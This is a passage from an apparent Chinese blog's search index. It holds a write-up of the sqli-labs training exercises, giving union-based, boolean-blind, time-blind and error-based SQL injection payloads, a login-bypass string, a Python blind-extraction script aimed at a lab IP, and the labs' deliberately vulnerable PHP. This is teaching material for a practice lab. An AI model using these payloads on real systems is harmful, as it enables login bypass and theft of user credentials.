group_concat(username) from users),3 –+ 不过这是咱在翻看了源代码，并且知道这些数据的情况下做出来的，在真正注入的环境下，得需要获取这些数据，这时候就需要information_schema这个数据库了 ?id=-1’ union select 1,(select group_concat(schema_name) from schemata),3 –+ 发生什么事了？好像有点不太对劲呢。因为这题所在的数据库是security，而schemata是在information_schema这个数据库下面的。我们需要换成information_schema.schemata ?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 数据库爆出来了，爆表名 ?id=-1’ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=”security”),3 –+ 表名出来了，爆字段 ?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=”users”),3 –+ 需要的数据都有了，咱可以直接把库给脱下来了 Less-2 - Less-4这几题都一样，无非是注入点周围包裹的东西不一样，不多赘述，过。 Less-5 | 布尔盲注 ?id=1 眉清目秀，啥都木有。 ?id=1”‘一通测试下来，发现有了报错信息 如何利用报错信息注入呢？ ?id=1’ and 1 = 1 –+i ?id=2’ and 2 = 1 –+ 那有意思的就来了，嘻嘻 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 爆数据库 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break 更改payload来爆表 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; 更改payload 来爆字段 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips 无AND的情况下，可以用^ Less 6-8 都差不多，就是需要各种奇妙的闭合略 Less 9这里需要时间盲注，和布尔盲注差不多只是需要添加一个if(a,sleep(10),1)判断 ?id=1’ and if(1=1,sleep(5),1)–+ 判断参数构造。 ?id=1’and if(length((select database()))&gt;9,sleep(5),1)–+ 判断数据库名长度 ?id=1’and if(ascii(substr((select database()),1,1))=115,sleep(5),1)–+ 逐一判断数据库字符 ?id=1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)–+ 判断所有表名长度 ?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)–+ 逐一判断表名 ?id=1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’))&gt;20,sleep(5),1)–+ 判断所有字段名的长度 ?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),1,1))&gt;99,sleep(5),1)–+ 逐一判断字段名。 ?id=1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+ 判断字段内容长度 ?id=1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+ 逐一检测内容。 Less 10 一模一样，略Less 11 | 万能密码这次开始，不是get传参了，换成POST传参还给了个登录框，先随便穿个数据康康 这时候拿出我们的究极无敌炫酷万能密码1' or 1=1# 好了，这就进去了 为什么呢？咱把源码翻开 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //注意这里 $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; 关键点在这里$result=mysql_query($sql); 这里的结果是用sql语句的查询结果来，所以只需要让语句返回一个真就行了，or 1 = 1使得整个语句恒真，这就让我们成功登陆进去了 之后我们就可以注入获取信息了。 Less 12 -16 都差不多略 Less 17 | 报错注入这题开始不同了，使用的是update而不是select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} 报错注入开淦 能进行报错的函数extractvalue() 演示: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))# 爆版本 1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))# 爆数据库 1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# 爆表名 1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x5c)))# 爆字段名 1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=’admin1’) b) ,0x5c)))# 爆字段内容该格式针对mysql数据库。 1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# 爆字段内容。 #### updatexml() #### group by","link":"/2022/10/06/sql/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"}],"categories":[]}